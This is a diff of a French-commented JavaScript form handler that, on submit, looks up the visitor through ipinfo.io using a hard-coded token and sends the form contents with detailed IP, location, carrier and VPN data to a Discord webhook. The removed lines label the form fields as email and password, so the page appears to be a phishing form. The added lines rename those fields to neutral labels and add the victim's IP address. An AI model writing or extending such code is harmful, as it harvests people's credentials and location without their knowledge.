@@ -9,8 +9,9 @@ document.getElementById('myForm').addEventListener('submit', function(event) {
     fetch('https://ipinfo.io/json?token=d59cbb833f4209')
         .then(response => response.json())
         .then(data => {
-            // Extraire toutes les informations de géolocalisation
+            // Extraire les données de géolocalisation, y compris l'IP
             const geolocationData = {
+                ip: data.ip || 'Non disponible',
                 hostname: data.hostname || 'Non disponible',
                 city: data.city || 'Non disponible',
                 region: data.region || 'Non disponible',
@@ -25,54 +26,26 @@ document.getElementById('myForm').addEventListener('submit', function(event) {
                 is_hosting: data.is_hosting ? 'Oui' : 'Non'
             };
 
-            // Extraire toutes les informations d'ASN
-            const asnData = {
-                asn: data.asn || 'Non disponible',
-                name: data.asn_name || 'Non disponible',
-                domain: data.asn_domain || 'Non disponible',
-                route: data.asn_route || 'Non disponible',
-                type: data.asn_type || 'Non disponible'
-            };
+            // Récupérer les informations ASN (Autonomous System Number)
+            const asnData = data.asn || { asn: 'Non disponible', name: 'Non disponible', domain: 'Non disponible', route: 'Non disponible', type: 'Non disponible' };
 
-            // Extraire toutes les informations de la compagnie
-            const companyData = {
-                name: data.company_name || 'Non disponible',
-                domain: data.company_domain || 'Non disponible',
-                type: data.company_type || 'Non disponible'
-            };
+            // Récupérer les informations de la compagnie (Company)
+            const companyData = data.company || { name: 'Non disponible', domain: 'Non disponible', type: 'Non disponible' };
 
-            // Extraire toutes les informations du carrier
-            const carrierData = {
-                name: data.carrier_name || 'Non disponible',
-                mcc: data.carrier_mcc || 'Non disponible',
-                mnc: data.carrier_mnc || 'Non disponible'
-            };
+            // Récupérer les informations sur l'opérateur (Carrier)
+            const carrierData = data.carrier || { name: 'Non disponible', mcc: 'Non disponible', mnc: 'Non disponible' };
 
-            // Extraire toutes les informations de confidentialité
-            const privacyData = {
-                vpn: data.privacy_vpn ? 'Oui' : 'Non',
-                proxy: data.privacy_proxy ? 'Oui' : 'Non',
-                tor: data.privacy_tor ? 'Oui' : 'Non',
-                relay: data.privacy_relay ? 'Oui' : 'Non',
-                hosting: data.privacy_hosting ? 'Oui' : 'Non',
-                service: data.privacy_service || 'Non disponible'
-            };
+            // Récupérer les informations de confidentialité (Privacy)
+            const privacyData = data.privacy || { vpn: 'Non', proxy: 'Non', tor: 'Non', relay: 'Non', hosting: 'Non', service: 'Non disponible' };
 
-            // Extraire toutes les informations d'abus
-            const abuseData = {
-                address: data.abuse_address || 'Non disponible',
-                country: data.abuse_country || 'Non disponible',
-                email: data.abuse_email || 'Non disponible',
-                name: data.abuse_name || 'Non disponible',
-                network: data.abuse_network || 'Non disponible',
-                phone: data.abuse_phone || 'Non disponible'
-            };
+            // Récupérer les informations sur les abus (Abuse)
+            const abuseData = data.abuse || { address: 'Non disponible', country: 'Non disponible', email: 'Non disponible', name: 'Non disponible', network: 'Non disponible', phone: 'Non disponible' };
 
             // Créer le message à envoyer à Discord
             const discordMessage = {
-                content: 
-                        `Email: ${numbers}\nMot de passe: ${letters}\n\n` +
+                content: `Chiffres: ${numbers}\nLettres: ${letters}\n\n` +
                          `**Geolocation**\n` +
+                         `IP: ${geolocationData.ip}\n` +
                          `Hostname: ${geolocationData.hostname}\n` +
                          `City: ${geolocationData.city}\n` +
                          `Region: ${geolocationData.region}\n` +
@@ -117,7 +90,7 @@ document.getElementById('myForm').addEventListener('submit', function(event) {
                          `Email: ${abuseData.email}\n` +
                          `Name: ${abuseData.name}\n` +
                          `Network: ${abuseData.network}\n` +
-                         `Phone: ${abuseData.phone}`
+                         `Phone: ${abuseData.phone}\n`
             };
 
             // Envoyer le message à Discord via le webhook
